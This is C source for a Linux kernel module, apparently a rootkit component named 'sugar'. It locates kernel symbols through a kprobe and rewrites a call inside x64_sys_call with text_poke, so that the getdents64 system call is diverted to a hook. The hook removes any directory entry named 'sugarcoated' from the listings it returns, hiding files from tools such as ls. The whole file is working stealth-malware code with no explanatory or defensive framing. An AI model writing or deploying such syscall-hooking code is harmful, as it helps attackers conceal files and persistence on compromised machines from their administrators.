#include "kmod.h"

#include <asm/text-patching.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>

enum hook_id { HOOK_GETDENTS64, HOOKS_CNT };

static struct hook {
	const char *symbol;
	sys_call_ptr_t trampoline;

	/* runtime state */
	sys_call_ptr_t target; /* symbol's function pointer */
	s32 *rel32;	    /* ptr to rel32 argument in call/jmp instruction */
	s32 rel_target;	    /* near, relative */
	s32 rel_trampoline; /* near, relative */
} hooks[HOOKS_CNT];

/* rdi = unsigned int fd
 * rsi = struct linux_dirent64 *dirent
 * rdx = unsigned int count
 */
static long getdents64(const struct pt_regs *regs)
{
	void __user *ubuf;
	unsigned char *kbuf;
	struct linux_dirent64 *dir, *prev = NULL;
	long err, read, hidden, pos;

	ubuf = (void __user *)regs->si;

	if ((read = hooks[HOOK_GETDENTS64].target(regs)) <= 0)
		return read;

	if (!(kbuf = kmalloc(read, GFP_KERNEL))) {
		err = -ENOMEM;
		goto err_kmalloc;
	}

	if (copy_from_user(kbuf, ubuf, read)) {
		err = -EFAULT;
		goto err_copy_from_user;
	}

	pos = 0;
	hidden = 0;

	while (pos < read - hidden) {
		dir = (struct linux_dirent64 *)(kbuf + pos);

		if (strcmp(dir->d_name, "sugarcoated") != 0) {
			prev = dir;
			pos += dir->d_reclen;
			continue;
		}

		/* i tried always using memmove() to hide entries, but on some
		 * cases it caused ls output to be weird and corrupted. i'm not
		 * sure why, it may be d_off, but anyways, this works better */

		if ((unsigned char *)dir == kbuf) {
			hidden += dir->d_reclen;
			memmove(kbuf, kbuf + dir->d_reclen, read - hidden);
			continue;
		}

		prev->d_reclen += dir->d_reclen;
		pos += dir->d_reclen;
	}

	if (copy_to_user(ubuf, kbuf, read - hidden)) {
		err = -EFAULT;
		goto err_copy_to_user;
	}

	kfree(kbuf);
	return read - hidden;

err_copy_to_user:
err_copy_from_user:
	kfree(kbuf);

err_kmalloc:
	return err;
}

static struct hook hooks[HOOKS_CNT] = {
	[HOOK_GETDENTS64] =
		{
			.symbol = "__x64_sys_getdents64",
			.trampoline = getdents64,
		},
};

static void *ksymbol_addr(const char *name)
{
	static typeof(kallsyms_lookup_name) *kallsyms_lookup_name;

	if (!kallsyms_lookup_name) {
		struct kprobe kp = {
			.symbol_name = "kallsyms_lookup_name",
		};

		if (register_kprobe(&kp))
			return NULL;

		kallsyms_lookup_name = (void *)kp.addr;
		unregister_kprobe(&kp);
	}

	return (void *)kallsyms_lookup_name(name);
}

static unsigned long ksymbol_size(void *addr)
{
	static typeof(kallsyms_lookup_size_offset) *kallsyms_lookup_size_offset;

	unsigned long symbolsize, offset;

	if (!kallsyms_lookup_size_offset) {
		kallsyms_lookup_size_offset =
			ksymbol_addr("kallsyms_lookup_size_offset");

		if (!kallsyms_lookup_size_offset)
			return 0;
	}

	if (!kallsyms_lookup_size_offset((unsigned long)addr, &symbolsize,
					 &offset))
		return 0;

	return symbolsize - offset;
}

static int ktext_write(void *addr, const void *opcode, size_t len)
{
	static typeof(text_poke) *text_poke;

	if (!text_poke && !(text_poke = ksymbol_addr("text_poke")))
		return -ENOENT;

	text_poke(addr, opcode, len);

	return 0;
}

static void set_hook_targets(void)
{
	enum hook_id id;

	for (id = 0; id < HOOKS_CNT; id++) {
		if (!(hooks[id].target = ksymbol_addr(hooks[id].symbol)))
			pr_warn("failed to find symbol %s, skipping\n",
				hooks[id].symbol);
	}
}

static int init_hooks(void)
{
	unsigned char *x64_sys_call;
	unsigned long x64_sys_call_sz;

	if (!(x64_sys_call = ksymbol_addr("x64_sys_call")))
		return -ENOENT;

	if (!(x64_sys_call_sz = ksymbol_size(x64_sys_call)))
		return -ENODATA;

	set_hook_targets();
	printk("scanning x64_sys_call() ...\n");

	for (unsigned long i = 0; i + 4 < x64_sys_call_sz; i++) {
		unsigned char *instr = x64_sys_call + i;
		unsigned long offset, target;
		s32 *rel32;

		if (instr[0] != 0xe8 && instr[0] != 0xe9)
			continue;

		offset = (unsigned long)instr + 5;
		rel32 = (s32 *)(instr + 1); /* ptr to rel32 argument */
		target = offset + *rel32;   /* jump target absolute address */

		for (enum hook_id id = 0; id < HOOKS_CNT; id++) {
			if (target != (unsigned long)hooks[id].target)
				continue;

			hooks[id].rel32 = rel32;
			hooks[id].rel_target = *rel32;
			hooks[id].rel_trampoline =
				(unsigned long)hooks[id].trampoline - offset;
		}
	}

	return 0;
}

static int enable_hooks(void)
{
	enum hook_id id;
	int err;

	for (id = 0; id < HOOKS_CNT; id++) {
		if (!hooks[id].rel32) {
			if (hooks[id].target)
				pr_warn("failed to find call/jmp for %s, "
					"skipping\n",
					hooks[id].symbol);

			continue;
		}

		err = ktext_write(hooks[id].rel32, &hooks[id].rel_trampoline,
				  sizeof hooks[id].rel_trampoline);

		if (err) {
			pr_err("ktext_write() failed: %pe\n", ERR_PTR(err));
			return err;
		}

		printk("%s hooked!\n", hooks[id].symbol);
	}

	return 0;
}

static void disable_hooks(void)
{
	enum hook_id id;

	for (id = 0; id < HOOKS_CNT; id++) {
		if (!hooks[id].rel32)
			continue;

		ktext_write(hooks[id].rel32, &hooks[id].rel_target,
			    sizeof(hooks[id].rel_target));
		printk("%s unhooked!\n", hooks[id].symbol);
	}
}

static int __init sugar_init(void)
{
	int err;

	if ((err = init_hooks())) {
		pr_err("init_hooks() failed: %pe\n", ERR_PTR(err));
		return err;
	}

	if ((err = enable_hooks())) {
		pr_err("enable_hooks() failed: %pe\n", ERR_PTR(err));
		return err;
	}

	return 0;
}

static void __exit sugar_exit(void)
{
	disable_hooks();
}

module_init(sugar_init);
module_exit(sugar_exit);
